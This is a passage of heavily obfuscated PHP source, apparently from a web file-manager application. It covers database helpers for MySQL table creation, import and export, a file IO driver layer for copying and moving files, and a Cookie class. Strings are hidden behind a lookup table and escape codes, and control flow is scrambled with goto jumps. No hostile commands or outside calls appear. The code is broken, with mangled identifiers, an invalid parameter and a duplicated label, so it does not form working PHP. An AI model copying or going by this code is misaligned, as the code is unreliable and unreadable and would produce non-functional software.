$this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($c) { return addslashes($c); } public function setModel($Eݾ넂) { $this->model = $Eݾ넂; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($B, $c = '') { $this->database = $B; $this->type = $c; } public function model($c = '') { return new ModelBase($c, $_SERVER[ԥ][33], $this->database); } public function db($e￲̓ = false) { goto C޴; A޶: $this->database = $D϶; $fѯ = $this->model()->db(); $a޹ = $fѯ->execute("\x73\x68\x6f\x77\x20\x64\141\164\141\142\141\x73\145\163\x20\x6c\x69\153\x65\x20\47{$D}\x27"); goto Dକˢ; eɚݏ: $D = $D϶[$d[230]]; $D϶[$d[230]] = $d[33]; if ($D϶[$d[873]] == $d[708]) { $Cℸ = $D϶[$d[872]]; $D϶[$d[872]] = substr($Cℸ, 0, strrpos($Cℸ, $d[958])); } goto A޶; cӹ: $this->database = $D϶; $fѯ->execute("\165\x73\x65\x20\x60{$D}\140"); return $fѯ; goto bې؂; C޴: $d =& $_SERVER[ԥ]; $D϶ = $this->database; if ($this->type == $d[9] || !$e￲̓) { return $this->model()->db(); } goto eɚݏ; Dକˢ: if (!$a޹) { $fѯ->execute("\143\162\145\x61\164\145\x20\144\x61\x74\141\142\141\x73\145\40\140{$D}\140"); } $D϶[$d[230]] = $D; if ($D϶[$d[873]] == $d[708]) { $D϶[$d[872]] .= $d[958] . $D; } goto cӹ; bې؂: } public function createTable($c蕦, $dѢ = null) { $CԖ =& $_SERVER[ԥ]; if (!IO::exist($c蕦)) { show_json(LNG($CԖ[959]), !1); } $Dʧ = sqlSplit(IO::getContent($c蕦)); foreach ($Dʧ as $d㖉) { if ($dѢ) { $d털 = stripos($d㖉, $CԖ[960]) === 0; if ($d털) { $dѢ->task[$CԖ[961]] += 1; } } $this->model()->db()->execute($d㖉); if ($dѢ && $d털) { $B⑒ = $CԖ[962]; preg_match($B⑒, $d㖉, $A); $dѢ->task[$CԖ[963]] = trim($c[0], $CԖ[809]); $dѢ->update(1); } } $this->taskToCache($dѢ); } public function insertTable($eк, $eɡ = null) { $Bس =& $_SERVER[ԥ]; foreach ($eк as $EȺÂ) { $F˜ = basename($EȺÂ); $F˜ = substr($F˜, 0, strrpos($F˜, $Bس[91])); if ($eɡ) { $eɡ->task[$Bس[963]] = $F˜; } if (get_filesize($EȺÂ) == 0) { continue; } $d = $this->sqlToDb($EȺÂ, $eɡ); if (!$d) { show_json(LNG($Bس[964]) . "\133{$F˜}\x5d", !1); } } $this->taskToCache($eɡ); } public function sqlFromDb($aߙ, $F箺, $Fը = null, $eܕ = null) { goto e۾; e۾: if ($Fը) { $Fը->task[$_SERVER[ԥ][963]] = $aߙ; } $Bޥ = $this->model($aߙ); $a垯 = 0; goto D; D: $d߹ = 1; $Cƣ = 500; $cզ = fopen($F箺, $_SERVER[ԥ][965]); goto E㚎; EԾ: fclose($cզ); return $a垯; goto F뒅; E㚎: $fΆ = $Bޥ->getPk(); $b帼 = $Bޥ->getDbFields(); do { $b憃 = $Bޥ->field($b帼)->order($fΆ . $_SERVER[ԥ][966])->selectPage($Cƣ, $d߹); $Cǡ = !empty($b憃[$_SERVER[ԥ][350]]) ? $b憃[$_SERVER[ԥ][350]] : array(); if (!($F = count($Cǡ))) { break; } if ($Fը) { $Fը->task[$_SERVER[ԥ][961]] += $F; } $a׌쩩 = array(); foreach ($Cǡ as $f˟) { if ($eܕ) { $f˟[$_SERVER[ԥ][75]] = "\x7b\x69\157\72{$eܕ}\175" . substr($f˟[$_SERVER[ԥ][75]], strlen("\x7b\151\157\x3a{$f˟[$_SERVER[ԥ][735]]}\175")); $f˟[$_SERVER[ԥ][735]] = $eܕ; } $a׌쩩[] = $_SERVER[ԥ][967] . $this->sqlEncode($f˟) . $_SERVER[ԥ][968]; } $f߈ = "\x49\116\123\105\x52\x54\40\111\x4e\124\x4f\40\140{$aߙ}\140\x20\x28\140" . implode($_SERVER[ԥ][969], $b帼) . $_SERVER[ԥ][970]; fwrite($cզ, $f߈ . implode($_SERVER[ԥ][971], $a׌쩩) . $_SERVER[ԥ][67] . PHP_EOL); $d߹++; $a垯 += $F; if ($Fը) { $Fը->update($F); } } while ($F == $Cƣ); goto EԾ; F뒅: } public function sqlToDb($b͚, $bϡ = null) { goto dՐ; b: if (!$a̖) { return !1; } $Cӟ = 0; $D = $bޞ[33]; goto bԃ; bԃ: $fݍ = 500 + 1; while (!feof($a̖)) { if ($bϡ && $Cӟ != 0) { $bϡ->task[$bޞ[961]] += 1; } $Cӟ++; $AՖ = trim(fgets($a̖)); $D .= $bޞ[50] . $this->sqlDecode($AՖ, $this->type); if ($Cӟ == $fݍ) { $D = rtrim(trim($D), $bޞ[67]); if (!$e莨->execute($D)) { return !1; } if ($bϡ) { $bϡ->update($Cӟ - 1); } $D = $bޞ[33]; $Cӟ = 0; } } fclose($a̖); goto fΑ; fΑ: if ($D) { $D = rtrim(trim($D), $bޞ[67]); if (!$e莨->execute($D)) { return !1; } if ($bϡ) { $bϡ->update($Cӟ - 1); } } return !0; goto dΫ; dՐ: $bޞ =& $_SERVER[ԥ]; $e莨 = $this->model()->db(); $a̖ = @fopen($b͚, $bޞ[972]); goto b; dΫ: } public function dropTable($FԪ = null) { $Ȇڏ = $this->model()->db(); $dם = $FԪ ? array($FԪ) : $Ȇڏ->getTables(); if (!$dם) { return; } foreach ($dם as $FԪ) { $Ȇڏ->execute("\x64\x72\x6f\160\x20\x74\141\x62\x6c\145\x20\x69\146\40\145\x78\x69\x73\x74\x73\x20\x60{$FԪ}\140"); } } private function taskToCache($Fۢ = null) { $F =& $_SERVER[ԥ]; if (!$Fۢ) { return; } $a = array($F[963] => $Fۢ->task[$F[963]], $F[961] => $Fۢ->task[$F[961]], $F[973] => $Fۢ->task[$F[973]]); if ($a[$F[961]] == $a[$F[973]]) { $a[$F[680]] = 1; } Cache::set($F[974] . $Fۢ->task[$F[363]], $a); $Fۢ->end(); } private function sqlEncode($Aɧ) { $E =& $_SERVER[ԥ]; $B̂ = array(); foreach ($Aɧ as $Eݲ) { if (is_array($Eݲ)) { $Eݲ = json_encode_force($Eݲ); } $Eݲ = addslashes($Eݲ); $Eݲ = str_replace(array($E[975], $E[213]), array($E[976], $E[977]), $Eݲ); $B̂[] = str_replace($E[55], $E[978], $Eݲ); } return $E[55] . implode($E[979], $B̂) . $E[55]; } private function sqlDecode($eƛ, $Aɢ) { $f䚅ԍ =& $_SERVER[ԥ]; $eƛ = str_replace(array($f䚅ԍ[976], $f䚅ԍ[977]), array($f䚅ԍ[975], $f䚅ԍ[213]), $eƛ); if ($Aɢ == $f䚅ԍ[9]) { $eƛ = stripslashes($eƛ); } return $eƛ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($A, $C¦) { $e = self::driverMake($C¦[0]); if (method_exists($e, $A)) { return @call_user_func_array(array($e, $A), $C¦); } if (method_exists($e, $_SERVER[ԥ][980])) { return @call_user_func_array(array($e, $A), $C¦); } else { if (method_exists(self, $A)) { return @call_user_func_array(array(self, $A), $C¦); } else { call_user_func_array(array(parent, $A), $C¦); } } } public static function init($E;) { return self::driverMake($E;); } public static function copy($bڬ, $CĈ, $c = false, $e = false) { return self::copyMove($bڬ, $CĈ, $c, $_SERVER[ԥ][486], $e); } public static function move($c񬾙܊, $aޱ, $f = false, $CՓ = false) { return self::copyMove($c񬾙܊, $aޱ, $f, $_SERVER[ԥ][488], $CՓ); } public static function saveFile($CՓ, $E펉, $bߧ = true) { goto Eв; Eв: $B胿Ղ =& $_SERVER[ԥ]; $E = self::info($E펉); $aˋ = self::driverMake($CՓ); goto F; F: $a㊐ԏ = self::driverMake($E펉); $bǟ̢ = !1; if ($a㊐ԏ->pathParse[$B胿Ղ[981]]) { $EĠ = $a㊐ԏ->pathParse[$B胿Ղ[981]]; $bǟ̢ = $a㊐ԏ; $a㊐ԏ = self::driverMake($EĠ); } goto bﱓ; bﱓ: $Dߔ = $a㊐ԏ->pathFather($E펉); $bü = !0; if (!$bߧ && self::driverIsSame($aˋ, $a㊐ԏ)) { $bü = !1; } goto cЕ; cЕ: $FĒ = self::copyFile($aˋ, $CՓ, $a㊐ԏ, $Dߔ, $E[$B胿Ղ[28]], $bü); if ($bǟ̢) { $FĒ = $bǟ̢->getPathOuter($FĒ); } return $FĒ; goto Aϝ; Aϝ: } private static function copyMove($E󓱩, $Cհ, $b擫, $CӶ, $d줒 = false) { goto CčƮ; CčƮ: $fˬ =& $_SERVER[ԥ]; if (!$E󓱩 || $E󓱩 == $fˬ[8] || !$Cհ) { return !1; } ignore_timeout(); goto D֬; e뚢: Hook::trigger($fˬ[72], $bխ, $E󓱩, $b﷣, $Cհ); $a䠱 = self::driverIsSame($bխ, $b﷣); if ($a䠱) { if ($CӶ == $fˬ[488] && trim($Cհ, $fˬ[8]) == trim($b﷣->pathFather($E󓱩), $fˬ[8])) { return $b﷣->getPathOuter($E󓱩); } if (method_exists($b﷣, $CӶ)) { return $b﷣->{$CӶ}($E󓱩, $Cհ, $b擫); } } goto DɃɖ; DɃɖ: $A͓ = $bխ->isFile($E󓱩); if (!$A͓ && $b﷣->getType() == $fˬ[678] && $bխ->getType() == $fˬ[101]) { $dʍԽ = $b﷣->copyFolderFromIO($bխ, $E󓱩, $Cհ, $b擫, $Aδ, $d줒); } else { $dʍԽ = self::copyPath($bխ, $E󓱩, $b﷣, $Cհ, $b擫, $Aδ, $A͓, $d줒); } if ($dʍԽ && $Aδ) { $bխ->remove($E󓱩); } goto Fς; D֬: $bխ = self::driverMake($E󓱩); $b﷣ = self::driverMake($Cհ); $Aδ = $CӶ == $fˬ[488]; goto FȂ; FȂ: $EÑ = !1; if ($b﷣->pathParse[$fˬ[981]]) { $Cհ = $b﷣->pathParse[$fˬ[981]]; $EÑ = $b﷣; $b﷣ = self::driverMake($Cհ); } self::check($bխ, $E󓱩, $b﷣, $Cհ); goto e뚢; Fς: if ($EÑ) { $dʍԽ = $EÑ->getPathOuter($dʍԽ); } return $dʍԽ; goto cӏ; cӏ: } private static function check($A߾, $cʋα, $eĆ, &$Aݯʋ) { $DɟƬ =& $_SERVER[ԥ]; if (self::driverIsSame($A߾, $eĆ) && $A߾->isFolder($cʋα) && $A߾->isParentOf($cʋα, $Aݯʋ)) { show_json(LNG($DɟƬ[982]), !1); } if (!$A߾->exist($cʋα)) { show_json(LNG($DɟƬ[100]), !1); } } private static function copyPath($dî, $e, $c, $f▻Ʀ, $A钕, $F̅┇, $Aѷ, $dЫ = false) { goto eǑ; AӰ: $f = $c->mkdir($c->getPath($A)); $f▻Ʀ = $c->getPathInner($f); $Eֵ = $dî->listPath($e, !0); goto A; A: $Dݞ = array_merge($Eֵ[$B۳ۘ[73]], $Eֵ[$B۳ۘ[74]]); foreach ($Dݞ as $bą) { $Bސ = $bą[$B۳ۘ[29]] == $B۳ۘ[163]; $e = $dî->getPathInner($bą[$B۳ۘ[75]]); $b = self::copyPath($dî, $e, $c, $f▻Ʀ, $A钕, $F̅┇, $Bސ); if (!$b) { write_log($B۳ۘ[983] . $e . $B۳ۘ[984] . $f▻Ʀ, $B۳ۘ[985]); } } return $f; goto Dڥ; eǑ: $B۳ۘ =& $_SERVER[ԥ]; $A = $dЫ ? $dЫ : $dî->getPathName($dî->pathThis($e)); if ($A钕) { $fքς˭ = $c->fileNameExist($f▻Ʀ, $A); $A = $c->fileNameAuto($f▻Ʀ, $A, $A钕, !$Aѷ); $A钕 = $fքς˭ ? $A钕 : !1; } goto c; c: if ($Aѷ) { return self::copyFile($dî, $e, $c, $f▻Ʀ, $A, $F̅┇); } if ($A钕 == REPEAT_RENAME_FOLDER) { $A钕 = !1; } $A = rtrim($f▻Ʀ, $B۳ۘ[8]) . $B۳ۘ[8] . $A; goto AӰ; Dڥ: } private static function copyFile($b΅, $Dᘄ, $f߶, $Aؒ, $c, $BÃ) { goto E; d: $Cޓ = $b΅->iconvApp($Cޓ); $e̡ = $f߶->upload($Aؒ, $Cޓ, $BÃ); self::remove($F . $A); goto aә; aә: Hook::trigger($aΘ[988], $b΅, $Dᘄ, $f߶, $Aؒ, $c, $e̡); return $e̡; goto fݸ᎐; B: Hook::trigger($aΘ[987], $b΅, $Dᘄ, $f߶, $Aؒ, $c, $A); if (self::driverIsSame($b΅, $f߶)) { if ($BÃ) { $e̡ = $f߶->moveFile($Dᘄ, $Aؒ); } else { $e̡ = $f߶->copyFile($Dᘄ, $Aؒ); } Hook::trigger($aΘ[988], $b΅, $Dᘄ, $f߶, $Aؒ, $c, $e̡); return $e̡; } $F = TEMP_FILES; goto c; E: $aΘ =& $_SERVER[ԥ]; $Aؒ = $f߶->getPath(rtrim($Aؒ, $aΘ[8]) . $aΘ[8] . $c); $A = $aΘ[986] . time() . rand_string(5); goto B; c: mk_dir($F); $Cޓ = $F . $A; $Cޓ = $b΅->download($Dᘄ, $Cޓ); goto d; fݸ᎐: } public static function pathFather($BġᏪ) { $B㴣܃ = IO::init($BġᏪ); $d = $B㴣܃->pathFather($B㴣܃->path); return $B㴣܃->getPathOuter($d); } public static function fileOut($F, $B = false, $Dٓ = false, $a䧙ǧ = '') { $bӼ = self::driverMake($F); if ($bӼ->isFileOutServer()) { return $bӼ->fileOutServer($F, $B, $Dٓ, $a䧙ǧ); } return $bӼ->fileOut($F, $B, $Dٓ, $a䧙ǧ); } public static function fileOutImage($Aż¤, $aи = 250) { $AᎵ = array(250, 600, 1200, 3000); for ($Eć = 0; $Eć < count($AᎵ); $Eć++) { if ($Eć == 0 && $aи <= $AᎵ[$Eć]) { $aи = $AᎵ[$Eć]; break; } else { if ($aи > $AᎵ[$Eć - 1] && $aи <= $AᎵ[$Eć]) { $aи = $AᎵ[$Eć]; break; } else { if ($Eć == count($AᎵ) - 1 && $aи > $AᎵ[$Eć]) { $aи = $AᎵ[$Eć]; break; } } } } $Dܾ = self::driverMake($Aż¤); if ($Dܾ->isFileOutServer()) { return $Dܾ->fileOutImageServer($Aż¤, $aи); } return $Dܾ->fileOutImage($Aż¤, $aи); } private static function driverIsSame($Bٶ, $Fއ) { goto C; aσ: if ($a != $fշ) { return !1; } if ($a == $dЂ٘[678]) { return !0; } if ($a == $dЂ٘[101]) { return !0; } goto F鸌; C: $dЂ٘ =& $_SERVER[ԥ]; $a = $Bٶ->getType(); $fշ = $Fއ->getType(); goto aσ; F鸌: if ($Bٶ->pathDriver == $Fއ->pathDriver) { return !0; } return !1; goto B; B: } public static function copyUpdate($e, $F) { goto A̻; A̻: $c福 =& $_SERVER[ԥ]; if (!IO::exist($e)) { return !1; } if (!IO::exist($F)) { IO::mkdir($F); } goto f; f΄: Hook::trigger($c福[992], $e, $F, $d); foreach ($EƐ as $Bߜ±) { IO::mkdir($Bߜ±); } foreach ($a as $Bߜ±) { IO::copy($Bߜ±[$c福[989]], $Bߜ±[$c福[990]], REPEAT_REPLACE); } goto Bߵ; f: $Eއ = self::_listAll($e); $F飲 = self::_listAll($F); $a = array(); goto c; c: $EƐ = array(); foreach ($Eއ as $EƵ => $Bߜ±) { if (isset($F飲[$EƵ])) { if ($Bߜ±[$c福[76]] == 1) { continue; } if ($F飲[$EƵ][$c福[77]] == $Bߜ±[$c福[77]]) { continue; } } if ($Bߜ±[$c福[76]] == 1) { $EƐ[] = $F . $c福[8] . $EƵ; continue; } $F = strstr(trim($EƵ, $c福[8]), $c福[8]) ? get_path_father($EƵ) : $c福[33]; $a[] = array($c福[989] => $Bߜ±[$c福[75]], $c福[990] => rtrim($F, $c福[8]) . $c福[8] . $F, $c福[991] => $Bߜ±); } $d = array($c福[163] => $a, $c福[76] => $EƐ); goto f΄; Bߵ: } private static function _listAll($Dɟɇ) { $FŸ =& $_SERVER[ԥ]; $Dɟɇ = KodIO::clear($Dɟɇ); $Fҭ = IO::listAll($Dɟɇ); foreach ($Fҭ as &$f둖) { $fӈ = substr($f둖[$FŸ[75]], strlen($Dɟɇ)); $f둖[$FŸ[993]] = trim($fӈ, $FŸ[8]); } return array_to_keyvalue($Fҭ, $FŸ[993]); } public static function fileSubstr($c, $eވ, $eװ = false) { goto F; A: if ($eވ + $eװ > $d) { $eװ = $d - $eވ; } if ($eװ <= 0) { return $_SERVER[ԥ][33]; } if ($eވ < 0 || $eވ >= $d || $eװ > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\x65\x52\x65\141\144\x20\145\x72\x72\x6f\162\x21\40\163\164\141\162\164\x3d{$eވ}\x3b\x6c\x65\156\x67\164\150\75{$eװ}\x3b\40\163\x69\172\145\x3d{$d}\x3b"); } goto Děχ; Děχ: return $Dב->fileSubstr($c, $eވ, $eװ); goto bނ; F: $Dב = self::driverMake($c); $d = $Dב->size($c); $f = $eވ; goto c̙; c̙: $A = $eװ; if ($eވ < 0) { $eވ = $d + $eވ; } if ($eװ === !1) { $eװ = $d - $eވ; } goto A; bނ: } private static function driverMake(&$c˨қ) { goto aؚ; aؚ: $F˙ =& $_SERVER[ԥ]; $F = KodIO::parse($c˨қ); if (!self::$driverListSystem) { $F֍ = Model($F˙[688])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($F֍, $F˙[363]); } goto Dԧ; Dԧ: if ($F[$F˙[29]] == KodIO::KOD_IO && !self::$driverListSystem[$F[$F˙[363]]]) { return !1; } $c˨қ = $F[$F˙[994]]; $B = self::driverGet($F, $c˨қ); goto C; C: return $B; goto d䙧; d䙧: } private static function driverGet($Bޥ؄, &$e؋ɗĎ) { goto e祐; eܭ･: $f֡->path = $e؋ɗĎ; return $f֡; goto B֐٣; e祐: $cø =& $_SERVER[ԥ]; $D = $Bޥ؄[$cø[995]]; $A = $Bޥ؄[$cø[363]]; goto f՛خ; b̚ߗ: $f֡ = self::$driverCache[$b͈]; $f֡->pathDriver = $D; $f֡->pathBase = $cø[33]; goto CÂ; CÂ: if (isset($Aⴠ[$cø[6]][$cø[1007]])) { $f֡->pathBase = rtrim($Aⴠ[$cø[6]][$cø[1007]], $cø[8]) . $cø[8]; $e؋ɗĎ = $f֡->pathBase . ltrim($e؋ɗĎ, $cø[8]); } $e؋ɗĎ = $f֡->getPath($e؋ɗĎ); if (isset($Bޥ؄[$cø[981]])) { $e؋ɗĎ = $Bޥ؄[$cø[981]]; } goto eܭ･; f՛خ: switch ($Bޥ؄[$cø[29]]) { case KodIO::KOD_IO: $Aⴠ = self::$driverListSystem[$A]; break; case KodIO::KOD_SOURCE: $e؋ɗĎ = $A . $e؋ɗĎ; $Aⴠ = array($cø[996] => $cø[997], $cø[6] => $Bޥ؄); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Cڅ = $GLOBALS[$cø[998]]; self::$driverListUser = array_to_keyvalue($Cڅ, $cø[363]); } $Aⴠ = self::$driverListUser[$A]; break; case KodIO::KOD_SHARE_LINK: $Aⴠ = array($cø[996] => $cø[999], $cø[6] => $Bޥ؄); $FܮƆ = Action($cø[1000])->sharePathInfo($Bޥ؄[$cø[75]]); $e؋ɗĎ = $FܮƆ[$cø[365]]; if (!$FܮƆ[$cø[365]]) { $B = Model($cø[532])->getInfo($FܮƆ[$cø[437]]); $e؋ɗĎ = KodIO::clear($B[$cø[1001]] . $Bޥ؄[$cø[994]]); $Bޥ؄[$cø[435]] = $B; $Bޥ؄[$cø[981]] = $e؋ɗĎ; $Aⴠ = array($cø[996] => $cø[1002], $cø[6] => $Bޥ؄); } break; case KodIO::KOD_SHARE_ITEM: $Aⴠ = array($cø[996] => $cø[1003], $cø[6] => $Bޥ؄); $B = Model($cø[532])->getInfo($Bޥ؄[$cø[363]]); if ($B[$cø[365]] == $cø[464]) { $e؋ɗĎ = KodIO::clear($B[$cø[1001]] . $Bޥ؄[$cø[994]]); $Bޥ؄[$cø[435]] = $B; $Bޥ؄[$cø[981]] = $e؋ɗĎ; $Aⴠ = array($cø[996] => $cø[1004], $cø[6] => $Bޥ؄); } break; default: $e؋ɗĎ = $Bޥ؄[$cø[75]]; $Aⴠ = array($cø[996] => $cø[1005]); break; } $b͈ = $Bޥ؄[$cø[75]]; if (!isset(self::$driverCache[$b͈])) { $f = strtolower($Aⴠ[$cø[90]]); $FȾ劃 = $GLOBALS[$cø[6]][$cø[84]][$cø[1006]]; $d̂ę = $cø[71] . (isset($FȾ劃[$f]) ? $FȾ劃[$f] : ucfirst($f)); if (!class_exists($d̂ę)) { show_json("{$d̂ę}\40\x6e\x6f\164\40\145\x78\151\163\164\x73\x21", !1); } $e = isset($Aⴠ[$cø[6]]) ? $Aⴠ[$cø[6]] : !1; self::$driverCache[$b͈] = new $d̂ę($e); } goto b̚ߗ; B֐٣: } } goto f녻; d: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($eɆ = '', $dȵ = 0) { if (is_string($eɆ) && $eɆ != $_SERVER[ԥ][33]) { $this->prefix = $eɆ; } if (is_numeric($dȵ) && $dȵ > 0) { $this->expire = $dȵ; } } public static function getInstance() { static $d; if ($d === null) { $d = new self(); } return $d; } private static $sameCookieSet = array(); public static function set($Dф, $bԷ, $a = 0, $aɧ = false, $Fڐ = false) { goto eиԝ; dؖ: setcookie($Dф, $bԷ, time() + $a, $aϊפ[8] . trim($Fڐ, $aϊפ[8]) . $E, !1, !1, $aɧ); goto b; b: self::$sameCookieSet[$Dф] = $bԷ . $a; if (!$Fڐ) { $Fڐ = str_replace(HOST, $aϊפ[33], APP_HOST); $Fڐ = _get($GLOBALS, $aϊפ[782], $Fڐ); } $E = $aϊפ[33]; goto dؖ; eиԝ: $aϊפ =& $_SERVER[ԥ]; if (!$a) { $a = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Dф]) && self::$sameCookieSet[$Dф] == $bԷ . $a) { return; } goto b; b: } public static function setSafe($Eմ, $B람ğ, $f = 0) { self::set($Eմ, $B람ğ, $f, !0); } public static function get($dڋ) { return isset($_COOKIE[$dڋ]) ? $_COOKIE[$dڋ] : !1; } public static function remove($e, $Eߋݏ = false) { unset($_COOKIE[$e]); self::set($e, $_SERVER[ԥ][33], 1, $Eߋݏ); } } class DbMysql extends Db { public function __construct($B䐂 = '') { $d挈ȡ =& $_SERVER[ԥ]; if (!extension_loaded($d挈ȡ[712])) { think_exception(think_lang($d挈ȡ[10]) . $d挈ȡ[783]); } if (!empty($B䐂)) { $this->config = $B䐂; if (empty($this->config[$d挈ȡ[13]])) { $this->config[$d挈ȡ[13]] = $d挈ȡ[33]; } } } public function connect($b̶ = '', $B = 0, $F೉ = false) { $A =& $_SERVER[ԥ]; if (!isset($this->linkID[$B])) { goto c; fÏ: if ($e旍) { $this->linkID[$B] = mysql_pconnect($b, $b̶[$A[786]], $b̶[$A[787]], 131072); } else { $this->linkID[$B] = mysql_connect($b, $b̶[$A[786]], $b̶[$A[787]], !0, 131072); } if (!$this->linkID[$B] || !empty($b̶[$A[17]]) && !mysql_select_db($b̶[$A[17]], $this->linkID[$B])) { think_exception(mysql_error()); } $cߍ = mysql_get_server_info($this->linkID[$B]); goto A; c: if (empty($b̶)) { $b̶ = $this->config; } $b = $b̶[$A[784]] . ($b̶[$A[785]] ? "\72{$b̶[$A[785]]}" : $A[33]); $e旍 = !empty($b̶[$A[13]][$A[14]]) ? $b̶[$A[13]][$A[14]] : $this->pconnect; goto fÏ; A: mysql_query($A[788] . think_config($A[789]) . $A[55], $this->linkID[$B]); if ($cߍ > $A[790]) { mysql_query($A[791], $this->linkID[$B]); } $this->connected = !0; goto C; C: if (1 != think_config($A[18])) { unset($this->config); } goto a; a: } return $this->linkID[$B]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($A߷) { goto f΄; A: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto f݋; f΄: $A郵 =& $_SERVER[ԥ]; if (0 === stripos($A߷, $A郵[248])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto cٖ; bʙ: think_action_status($A郵[19], 1); think_status($A郵[20]); $this->queryID = mysql_query($A߷, $this->_linkID); goto A; cٖ: if (!$this->_linkID) { return !1; } $this->queryStr = $A߷; if ($this->queryID) { $this->free(); } goto bʙ; f݋: } public function execute($E۾) { goto B礬; B㳘؞: $this->queryStr = $E۾; if ($this->queryID) { $this->free(); } think_action_status($Fǳ[21], 1); goto a߲; E՞ɇ: if (!1 === $e) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto cօ; B礬: $Fǳ =& $_SERVER[ԥ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B㳘؞; a߲: think_status($Fǳ[20]); $e = mysql_query($E۾, $this->_linkID); $this->debug(); goto E՞ɇ; cօ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ԥ][792], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bهޞ = mysql_query($_SERVER[ԥ][793], $this->_linkID); $this->transTimes = 0; if (!$bهޞ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dܧ = mysql_query($_SERVER[ԥ][794], $this->_linkID); $this->transTimes = 0; if (!$dܧ) { $this->error(); return !1; } } return !0; } private function getAll() { $fȗ = array(); if ($this->numRows > 0) { while ($f֠ = mysql_fetch_assoc($this->queryID)) { $fȗ[] = $f֠; } mysql_data_seek($this->queryID, 0); } return $fȗ; } public function getFields($cܱ) { $E =& $_SERVER[ԥ]; $EẼ = $this->query($E[795] . $this->parseKey($cܱ)); $Eż = array(); if ($EẼ) { foreach ($EẼ as $Fɏ => $eàߣ) { $Eż[$eàߣ[$E[27]]] = array($E[28] => $eàߣ[$E[27]], $E[29] => $eàߣ[$E[30]], $E[31] => (bool) (strtoupper($eàߣ[$E[32]]) === $E[796]), $E[34] => $eàߣ[$E[35]], $E[36] => strtolower($eàߣ[$E[37]]) == $E[38], $E[39] => strtolower($eàߣ[$E[40]]) == $E[41]); } } return $Eż; } public function getTables($a = '') { $B̘ =& $_SERVER[ԥ]; if (!empty($a)) { $Aͣ = $B̘[797] . $a; } else { $Aͣ = $B̘[798]; } $a΅ל = $this->query($Aͣ); $C퓫照 = array(); foreach ($a΅ל as $fƏ͔ => $A֡) { $C퓫照[$fƏ͔] = current($A֡); } return $C퓫照; } public function replace($F੠, $bԠ = array()) { $C˓ǐ =& $_SERVER[ԥ]; foreach ($F੠ as $dҏ => $cɠ) { $D̈́ = $this->parseValue($cɠ); if (is_scalar($D̈́)) { $d̓[] = $D̈́; $B̶೎[] = $this->parseKey($dҏ); } } $a = $C˓ǐ[799] . $this->parseTable($bԠ[$C˓ǐ[263]]) . $C˓ǐ[800] . implode($C˓ǐ[47], $B̶೎) . $C˓ǐ[801] . implode($C˓ǐ[47], $d̓) . $C˓ǐ[802]; return $this->execute($a); } public function insertAll($A׏, $Cٔ = array(), $c듞 = false) { goto f挬; f挬: $F۱Ҝʌ =& $_SERVER[ԥ]; if (!is_array($A׏[0])) { return !1; } $fʉ = array_keys($A׏[0]); goto FѲ; FѲ: $E = array(); foreach ($A׏ as $eʴΊ) { $A² = array(); foreach ($eʴΊ as $a􄂵δ => $EӗՒ) { $EӗՒ = $this->parseValue($EӗՒ); if (is_scalar($EӗՒ)) { $A²[] = $EӗՒ; } } $E[] = $F۱Ҝʌ[244] . implode($F۱Ҝʌ[47], $A²) . $F۱Ҝʌ[802]; } array_walk($fʉ, array($this, $F۱Ҝʌ[803])); goto Fԉ; Fԉ: $D = ($c듞 ? $F۱Ҝʌ[804] : $F۱Ҝʌ[805]) . $F۱Ҝʌ[806] . $this->parseTable($Cٔ[$F۱Ҝʌ[263]]) . $F۱Ҝʌ[800] . implode($F۱Ҝʌ[47], $fʉ) . $F۱Ҝʌ[807] . implode($F۱Ҝʌ[47], $E); return $this->execute($D); goto D; D: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $E =& $_SERVER[ԥ]; $this->error = mysql_errno() . $E[4] . mysql_error($this->_linkID); if ($E[33] != $this->queryStr) { $this->error .= LNG($E[45]) . $this->queryStr; } think_trace($this->error, $E[33], $E[46]); return $this->error; } public function escapeString($Dť) { if ($this->_linkID) { return mysql_real_escape_string($Dť, $this->_linkID); } else { return mysql_escape_string($Dť); } } public function parseKey(&$E, $B컜 = true) { $E =& $_SERVER[ԥ]; if ($B컜) { $E = $this->parseKeyCheck($E); } if ($E != $E[172] && !preg_match($E[808], $E)) { $E = $E[809] . trim($E, $E[809]) . $E[809]; } return $E; } } class DbMysqli extends Db { public function __construct($E = '') { $D톍 =& $_SERVER[ԥ]; if (!extension_loaded($D톍[711])) { think_exception(think_lang($D톍[10]) . $D톍[810]); } if (!empty($E)) { $this->config = $E; if (empty($this->config[$D톍[13]])) { $this->config[$D톍[13]] = $D톍[33]; } } } public function connect($Bٳ = '', $b = 0) { $DȔ =& $_SERVER[ԥ]; if (!isset($this->linkID[$b])) { goto e֊; F: $fΩ = $this->linkID[$b]->server_version; $this->linkID[$b]->query($DȔ[788] . think_config($DȔ[789]) . $DȔ[55]); if ($fΩ > $DȔ[790]) { $this->linkID[$b]->query($DȔ[791]); } goto c̓ع; c̓ع: $this->connected = !0; if (1 != think_config($DȔ[18])) { unset($this->config); } goto Cތ; e֊: if (empty($Bٳ)) { $Bٳ = $this->config; } $this->linkID[$b] = new mysqli($Bٳ[$DȔ[784]], $Bٳ[$DȔ[786]], $Bٳ[$DȔ[787]], $Bٳ[$DȔ[17]], $Bٳ[$DȔ[785]] ? intval($Bٳ[$DȔ[785]]) : 